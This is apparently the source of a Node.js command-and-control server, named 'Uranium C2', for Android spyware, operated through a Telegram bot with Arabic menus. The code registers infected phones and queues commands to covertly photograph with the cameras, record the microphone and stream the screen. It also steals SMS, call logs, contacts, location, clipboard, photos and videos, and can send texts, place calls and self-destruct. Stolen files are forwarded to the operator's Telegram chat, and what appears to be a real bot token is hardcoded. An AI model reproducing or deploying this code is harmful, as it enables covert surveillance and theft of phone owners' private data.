require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const TOKEN = process.env.TG_TOKEN || "8690276775:AAE_4IsiG6XekmLAMnEwOqBDKM-iJ6D7DUo";
const CHAT_ID = process.env.TG_ID || "7399463177";

if (!TOKEN || !CHAT_ID) {
    console.error('[-] Missing env: TG_TOKEN, TG_ID');
    process.exit(1);
}

const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
fs.mkdirSync(STORAGE_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_core_v23.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, android_sdk INTEGER, last_seen INTEGER, online INTEGER DEFAULT 0)`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT DEFAULT 'PENDING', created_at INTEGER, sent_at INTEGER)`);
});

const app = express();
const appBot = new telegramBot(TOKEN, { polling: true });
app.use(express.json({ limit: '100mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '200mb' }));

async function sendTg(msg, options = {}) {
    try { return await appBot.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML', ...options }); }
    catch (e) { console.error('TG:', e.message); }
}

function escapeHtml(s) {
    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

app.get('/', (req, res) => {
    res.send(`<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:80px;"><h1>[☢️] URANIUM C2 v23.0 — TITAN [☢️]</h1></body></html>`);
});

app.post('/api/v3/uranium/stream', (req, res) => {
    const nodeId = req.headers['x-node-id'] || 'unknown';
    const nodeModel = req.headers['x-node-model'] || 'Unknown';
    const sdk = parseInt(req.headers['x-android-sdk'] || '0');

    db.run(`INSERT INTO nodes (id, model, android_sdk, last_seen, online) VALUES (?,?,?,?,1)
        ON CONFLICT(id) DO UPDATE SET model=excluded.model, android_sdk=excluded.android_sdk, last_seen=excluded.last_seen, online=1`,
        [nodeId, nodeModel, sdk, Date.now()]);

    let payload;
    try { payload = req.body; }
    catch { return res.status(400).json({ status: 'BAD_PAYLOAD' }); }

    if (payload.type === 'TEXT_REPORT') {
        const text = (payload.data || '').substring(0, 3800);
        if (text.length > 2) sendTg(`☢️ <b>[${escapeHtml(nodeId)} | ${escapeHtml(nodeModel)}]</b>\n<pre>${escapeHtml(text)}</pre>`);
        return res.json({ status: 'ACK', task: null });
    }

    if (payload.type === 'TASK_RESULT') {
        db.run(`UPDATE tasks SET status='DONE' WHERE id=?`, [payload.taskId]);
        return res.json({ status: 'ACK', task: null });
    }

    if (payload.type === 'MEDIA_CHUNK') {
        const { uploadId, fileName, chunkIndex, totalChunks, isLast, fileHash, data } = payload;
        db.run(`INSERT OR REPLACE INTO media_chunks (upload_id,node_id,file_name,chunk_index,total_chunks,is_last,file_hash,received_at) VALUES (?,?,?,?,?,?,?,?)`,
            [uploadId, nodeId, fileName, chunkIndex, totalChunks, isLast ? 1 : 0, fileHash, Date.now()]);
        return res.json({ status: 'CHUNK_ACK' });
    }

    db.get(`SELECT * FROM tasks WHERE node_id=? AND status='PENDING' ORDER BY id ASC LIMIT 1`, [nodeId], (err, row) => {
        if (!row) return res.json({ status: 'ACK', task: null });
        db.run(`UPDATE tasks SET status='SENT', sent_at=? WHERE id=?`, [Date.now(), row.id]);
        res.json({ status: 'ACK', task: { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') } });
    });
});

app.post('/api/v3/uranium/upload_raw', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const fileName = path.basename(req.headers['x-file-name'] || `dump_${Date.now()}.bin`);
        if (!Buffer.isBuffer(req.body)) return res.status(400).json({ error: 'BAD_BINARY' });
        
        const saveDir = path.join(STORAGE_DIR, path.basename(nodeId));
        fs.mkdirSync(saveDir, { recursive: true });
        const finalPath = path.join(saveDir, `${Date.now()}_${fileName}`);
        fs.writeFileSync(finalPath, req.body);

        const mb = (req.body.length / 1024 / 1024).toFixed(2);
        await sendTg(`☢️ <b>${escapeHtml(fileName)}</b> (${mb}MB) من <code>${nodeId}</code>`);
        try { if (req.body.length <= 45 * 1024 * 1024) await appBot.sendDocument(CHAT_ID, finalPath, { caption: `${fileName}` }); } catch (_) {}
        res.json({ status: 'OK' });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(CHAT_ID)) return;
    const text = msg.text || '';

    if (text === '/start' || text === '/menu') {
        db.all(`SELECT * FROM nodes ORDER BY last_seen DESC LIMIT 15`, async (err, rows) => {
            if (!rows || !rows.length) return sendTg('⚠️ لا نودات.');
            const kb = rows.map(n => [{ text: `${n.online ? '🟢' : '⚫'} ${n.model}`, callback_data: `menu_${n.id}` }]);
            await sendTg('☢️ <b>v23 — اختر النود:</b>', { reply_markup: { inline_keyboard: kb } });
        });
    }
});

appBot.on('callback_query', async (query) => {
    if (String(query.from.id) !== String(CHAT_ID)) return;
    const data = query.data;
    const msg = query.message;

    if (data.startsWith('menu_')) {
        const nodeId = data.replace('menu_', '');
        // القائمة الجديدة مع الأوامر الـ 10
        const kb = { inline_keyboard: [
            [{ text: '🔦 فلاش ON', callback_data: `cmd_CMD_FLASH_ON_${nodeId}` }, { text: '🔦 فلاش OFF', callback_data: `cmd_CMD_FLASH_OFF_${nodeId}` }],
            [{ text: '📳 اهتزاز', callback_data: `cmd_CMD_VIBRATE_${nodeId}` }, { text: '🔊 تنبيه', callback_data: `cmd_CMD_BEEP_${nodeId}` }],
            [{ text: '📸 صورة خلفية', callback_data: `cmd_EXTRACT_CAMERA_SNAP_${nodeId}` }, { text: '🤳 صورة أمامية', callback_data: `cmd_EXTRACT_CAMERA_SNAP_FRONT_${nodeId}` }],
            [{ text: '🎙️ تنصت 6s', callback_data: `cmd_MIC_AI_LISTEN_${nodeId}` }, { text: '👁️ لقطة خاطفة', callback_data: `cmd_MICRO_BURST_SNAP_${nodeId}` }],
            [{ text: '📨 SMS', callback_data: `cmd_EXTRACT_SMS_${nodeId}` }, { text: '📞 مكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }],
            [{ text: '📇 جهات', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` }, { text: '📱 تطبيقات', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }],
            [{ text: '📍 GPS', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }, { text: '📋 حافظة', callback_data: `cmd_EXTRACT_CLIPBOARD_${nodeId}` }],
            [{ text: '🖼️ 20 صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }, { text: '📥 10 فيديو', callback_data: `cmd_EXTRACT_VIDEOS_${nodeId}` }],
            
            // --- أوامر v23 الجديدة ---
            [{ text: '📺 بث الشاشة', callback_data: `cmd_START_SCREEN_STREAM_${nodeId}` }, { text: '🛑 إيقاف البث', callback_data: `cmd_STOP_SCREEN_STREAM_${nodeId}` }],
            [{ text: '🏠 زر الرئيسية', callback_data: `cmd_CMD_HOME_${nodeId}` }, { text: '🔙 زر الرجوع', callback_data: `cmd_CMD_BACK_${nodeId}` }],
            [{ text: '📲 إرسال SMS', callback_data: `text_CMD_SEND_SMS_${nodeId}` }, { text: '📞 اتصال برقم', callback_data: `text_CMD_CALL_NUMBER_${nodeId}` }],
            [{ text: '🌐 فتح رابط', callback_data: `text_CMD_OPEN_URL_${nodeId}` }, { text: '🔊 ضبط الصوت', callback_data: `text_CMD_SET_VOLUME_${nodeId}` }],
            [{ text: '💡 إشعال الشاشة', callback_data: `cmd_CMD_SCREEN_ON_${nodeId}` }, { text: '🔒 قفل الشاشة', callback_data: `cmd_CMD_LOCK_SCREEN_${nodeId}` }],
            [{ text: '🔆 السطوع', callback_data: `text_CMD_BRIGHTNESS_${nodeId}` }],
            // -------------------------
            
            [{ text: '💥 Self Destruct', callback_data: `confirm_SELF_${nodeId}` }],
            [{ text: '🔙 رجوع', callback_data: 'back_home' }]
        ] };
        await appBot.editMessageText(`🎯 <b>النود:</b> <code>${nodeId}</code> — v23 Titan`, {
            chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML', reply_markup: kb
        });
    }
    else if (data.startsWith('text_')) {
        const parts = data.split('_');
        const targetNodeId = parts.pop();
        const action = parts.slice(1).join('_');
        const promptMsg = await appBot.sendMessage(msg.chat.id, `أرسل القيمة المطلوبة للأمر [${action}]:`);
        
        appBot.once('message', (msgReply) => {
            if (msgReply.chat.id === msg.chat.id) {
                const val = msgReply.text;
                db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, ?, 'PENDING', ?)`,
                    [targetNodeId, action, JSON.stringify({ text: val, phone: val, url: val, vol: parseInt(val), brightness: parseInt(val) }), Date.now()], async () => {
                        await appBot.sendMessage(msg.chat.id, `✅ تم إرسال الأمر [${action}] بالقيمة: ${val}`);
                    });
            }
        });
    }
    else if (data.startsWith('confirm_SELF_')) {
        const nodeId = data.replace('confirm_SELF_', '');
        await appBot.editMessageText(`⚠️ <b>تأكيد النسف</b> <code>${nodeId}</code>؟`, {
            chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: '✅ نعم', callback_data: `cmd_SELF_DESTRUCT_${nodeId}` }, { text: '❌ إلغاء', callback_data: `menu_${nodeId}` }]] }
        });
    }
    else if (data.startsWith('cmd_')) {
        const parts = data.split('_');
        const targetNodeId = parts.pop();
        const action = parts.slice(1).join('_');
        db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, '{}', 'PENDING', ?)`,
            [targetNodeId, action, Date.now()], async () => {
                await appBot.answerCallbackQuery(query.id, { text: `☢️ ${action}` });
            });
    }
    else if (data === 'back_home') {
        await appBot.deleteMessage(msg.chat.id, msg.message_id).catch(() => {});
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Uranium C2 v23.0 Titan on :${PORT}`));
